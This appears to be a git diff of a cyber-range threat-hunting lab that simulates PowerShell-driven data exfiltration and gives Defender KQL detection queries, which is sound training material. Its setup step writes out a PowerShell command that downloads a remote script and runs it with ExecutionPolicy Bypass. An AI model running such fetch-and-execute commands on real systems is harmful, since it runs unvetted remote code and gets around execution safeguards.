@@ -2,67 +2,61 @@
 **Use of Powershell to run "Malicious" script**
 
 ## Steps the "Bad Actor" took Create Logs and IoCs:
-1. Execute the following code in Powershell: [Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1]
+1. Execute the following code in Powershell: Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1
 
 ## What this script does:
-- This script downloads and executes a file named exfiltratedata.ps1 by while bypassing Powershell's security restrictions simulating data theft by a bad actor.
-
+- exfiltratedata.ps1 is a PowerShell script designed to simulate data exfiltration for cybersecurity training and testing. It demonstrates how sensitive files might be collected and transmitted by an attacker. Intended for use in controlled environments only.
 ---
 
 ## Tables Used to Detect IoCs:
 | **Parameter**       | **Description**                                                              |
 |---------------------|------------------------------------------------------------------------------|
-| **Name**| DeviceFileEvents|
+| **Name**| DeviceProcessEvents|
 | **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceinfo-table|
-| **Purpose**| Used for detecting TOR download and installation, as well as the shopping list creation and deletion. |
+| **Purpose**| Used for detection of archival software execution. |
 
 | **Parameter**       | **Description**                                                              |
 |---------------------|------------------------------------------------------------------------------|
-| **Name**| DeviceProcessEvents|
+| **Name**| DeviceFileEvents|
 | **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceinfo-table|
-| **Purpose**| Used to detect the silent installation of TOR as well as the TOR browser and service launching.|
+| **Purpose**| Used to detect the silent installation of 7zip as well as execution of exfiltratedata.ps1 powershell script.|
 
 | **Parameter**       | **Description**                                                              |
 |---------------------|------------------------------------------------------------------------------|
 | **Name**| DeviceNetworkEvents|
 | **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table|
-| **Purpose**| Used to detect TOR network activity, specifically tor.exe and firefox.exe making connections over ports to be used by TOR (9001, 9030, 9040, 9050, 9051, 9150).|
+| **Purpose**| Used to determine if any data has been exfiltrated from the network.|
 
 ---
 
 ## Related Queries:
 ```kql
-// Installer name == tor-browser-windows-x86_64-portable-(version).exe
-// Detect the installer being downloaded
-DeviceFileEvents
-| where FileName startswith "tor"
-
-// TOR Browser being silently installed
-// Take note of two spaces before the /S
+// Look for any kind of archive activity
+let archive_applications = dynamic(["winrar.exe", "7z.exe", "winzip32.exe", "peazip.exe", "Bandizip.exe", "UniExtract.exe", "POWERARC.EXE", "IZArc.exe", "AshampooZIP.exe", "FreeArc.exe"]);
+let VMName = "windows-target-1";
 DeviceProcessEvents
-| where ProcessCommandLine contains "tor-browser-windows-x86_64-portable-14.0.1.exe  /S"
-| project Timestamp, DeviceName, ActionType, FileName, ProcessCommandLine
-
-// TOR Browser or service was successfully installed and is present on the disk
-DeviceFileEvents
-| where FileName has_any ("tor.exe", "firefox.exe")
-| project  Timestamp, DeviceName, RequestAccountName, ActionType, InitiatingProcessCommandLine
-
-// TOR Browser or service was launched
-DeviceProcessEvents
-| where ProcessCommandLine has_any("tor.exe","firefox.exe")
-| project  Timestamp, DeviceName, AccountName, ActionType, ProcessCommandLine
-
-// TOR Browser or service is being used and is actively creating network connections
-DeviceNetworkEvents
-| where InitiatingProcessFileName in~ ("tor.exe", "firefox.exe")
-| where RemotePort in (9001, 9030, 9040, 9050, 9051, 9150)
-| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, RemoteIP, RemotePort, RemoteUrl
+| where FileName has_any(archive_applications)
 | order by Timestamp desc
 
-// User shopping list was created and, changed, or deleted
+
+// Look for any file activity, based on the Timestamp from any discovered process activity
+let specificTime = datetime(2024-10-15T19:00:48.5615171Z);
+let VMName = "windows-target-1";
 DeviceFileEvents
-| where FileName contains "shopping-list.txt"
+| where Timestamp between ((specificTime - 1m) .. (specificTime + 1m))
+| where DeviceName == VMName
+| order by Timestamp desc
+
+
+// Look for any network activity, based on the Timestamp from the process or file activity
+let VMName = "windows-target-1";
+let specificTime = datetime(2024-10-15T19:00:48.5615171Z);
+DeviceNetworkEvents
+| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
+| where DeviceName == VMName
+| order by Timestamp desc
+
+
 ```
 
 ---
@@ -88,5 +82,5 @@ DeviceFileEvents
 | **Version** | **Changes**                   | **Date**         | **Modified By**   |
 |-------------|-------------------------------|------------------|-------------------|
 | 1.0         | Initial Draft                 |'September 6, 2024'| 'Josh Madakor' |
-| 2.0         | Updated draft                 | `April 15, 2025`  | `Jordan West`   |
+| 2.0         | Updated draft                 | `April 16, 2025`  | `Jordan West`   |
 
